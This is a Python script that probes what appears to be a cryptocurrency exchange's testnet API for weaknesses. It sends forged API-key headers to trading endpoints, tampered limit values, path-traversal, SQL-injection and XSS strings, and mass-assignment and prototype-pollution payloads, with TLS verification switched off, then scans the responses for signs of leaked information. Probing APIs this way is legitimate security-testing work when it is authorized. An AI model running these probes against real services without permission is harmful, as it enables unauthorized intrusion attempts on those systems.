#!/usr/bin/env python3
"""
Test for business logic vulnerabilities:
- Price manipulation in orders
- Negative amounts
- Integer overflow
- Race conditions
"""
import requests
import json

requests.packages.urllib3.disable_warnings()

api = "https://api-testnet.bybit.com"

print("="*80)
print("TESTING BUSINESS LOGIC VULNERABILITIES")
print("="*80)

# Test 1: Try to access trading endpoints without proper auth
# Check if we can get info about orders, positions, etc.
print("\n[1] TESTING UNAUTHENTICATED ACCESS TO TRADING DATA")
print("-"*80)

trading_endpoints = [
    "/v5/order/realtime",
    "/v5/order/history",
    "/v5/position/list",
    "/v5/execution/list",
    "/v5/account/transaction-log",
]

for endpoint in trading_endpoints:
    try:
        # Try with various invalid but structured API keys
        headers = {
            "X-BAPI-API-KEY": "test",
            "X-BAPI-TIMESTAMP": "1234567890000",
            "X-BAPI-SIGN": "test"
        }
        r = requests.get(api + endpoint, headers=headers, timeout=5, verify=False)
        
        print(f"\n{endpoint}")
        print(f"  Status: {r.status_code}")
        
        if r.status_code == 200:
            data = r.json()
            print(f"  Response: {json.dumps(data)[:200]}")
            
            # Check error code
            ret_code = data.get('retCode', 0)
            if ret_code != 10003 and ret_code != 10001:  # Not "invalid key" errors
                print(f"  ⚠️  Unexpected error code: {ret_code}")
                print(f"  Full response: {json.dumps(data, indent=2)}")
                
    except Exception as e:
        pass

# Test 2: Parameter tampering on public endpoints
print("\n\n[2] TESTING PARAMETER TAMPERING")
print("-"*80)

tamper_tests = [
    ("/v5/market/tickers", {"category": "spot", "symbol": "BTCUSDT", "limit": "99999999"}),
    ("/v5/market/tickers", {"category": "spot", "symbol": "BTCUSDT", "limit": "-1"}),
    ("/v5/market/orderbook", {"category": "linear", "symbol": "BTCUSDT", "limit": "9999"}),
    ("/v5/market/kline", {"category": "linear", "symbol": "BTCUSDT", "interval": "1", "limit": "999999"}),
]

for endpoint, params in tamper_tests:
    try:
        r = requests.get(api + endpoint, params=params, timeout=5, verify=False)
        print(f"\n{endpoint} with {params}")
        print(f"  Status: {r.status_code}")
        
        if r.status_code == 200:
            data = r.json()
            result = data.get('result', {})
            
            # Check if we got more data than expected
            if isinstance(result, dict):
                for key, value in result.items():
                    if isinstance(value, list) and len(value) > 500:
                        print(f"  ⚠️  Got {len(value)} items for {key} - possible limit bypass!")
                        
    except Exception as e:
        pass

# Test 3: Test for information disclosure in error messages
print("\n\n[3] TESTING ERROR MESSAGE DISCLOSURE")
print("-"*80)

error_tests = [
    ("/v5/market/tickers", {"category": "../../../etc/passwd"}),
    ("/v5/market/tickers", {"category": "spot", "symbol": "'; DROP TABLE--"}),
    ("/v5/market/tickers", {"category": "spot", "symbol": "<script>alert(1)</script>"}),
    ("/v5/user/query-api", {"api_key": "../../config"}),
]

for endpoint, params in error_tests:
    try:
        r = requests.get(api + endpoint, params=params, timeout=5, verify=False)
        
        # Look for information disclosure in errors
        sensitive_patterns = [
            'stack trace', 'exception', 'error:', 'traceback',
            '/home/', '/var/', '/usr/', 'mysql', 'postgres',
            'internal server', 'debug', 'line '
        ]
        
        response_lower = r.text.lower()
        found_sensitive = [p for p in sensitive_patterns if p in response_lower]
        
        if found_sensitive:
            print(f"\n⚠️  {endpoint} with {str(params)[:50]}")
            print(f"  Found sensitive info: {found_sensitive}")
            print(f"  Response: {r.text[:400]}")
            
    except:
        pass

# Test 4: Check for mass assignment vulnerabilities
print("\n\n[4] TESTING MASS ASSIGNMENT")
print("-"*80)

# Try to set admin flags or bypass restrictions
mass_assign_payloads = [
    {"isAdmin": True, "role": "admin"},
    {"admin": 1, "superuser": True},
    {"permissions": ["all"], "role": "admin"},
    {"__proto__": {"isAdmin": True}},
]

test_endpoint = "/v5/market/tickers"

for payload in mass_assign_payloads:
    try:
        params = {"category": "spot", "symbol": "BTCUSDT"}
        params.update(payload)
        
        r = requests.get(api + test_endpoint, params=params, timeout=5, verify=False)
        
        # Check if admin fields appear in response
        if any(x in r.text.lower() for x in ['admin', 'permission', 'role', 'superuser']):
            print(f"\n⚠️  Payload reflected: {payload}")
            print(f"  Response: {r.text[:300]}")
            
    except:
        pass

print("\n" + "="*80)
print("BUSINESS LOGIC TEST COMPLETE")
print("="*80)
